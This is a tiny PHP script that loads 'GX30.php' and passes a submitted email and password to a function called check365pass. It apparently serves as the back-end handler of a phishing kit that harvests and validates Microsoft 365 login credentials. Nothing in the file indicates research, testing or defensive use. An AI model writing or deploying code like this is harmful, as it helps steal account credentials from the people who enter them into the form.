<?php
require 'GX30.php';
check365pass($_POST['email'],$_POST['password']);
?>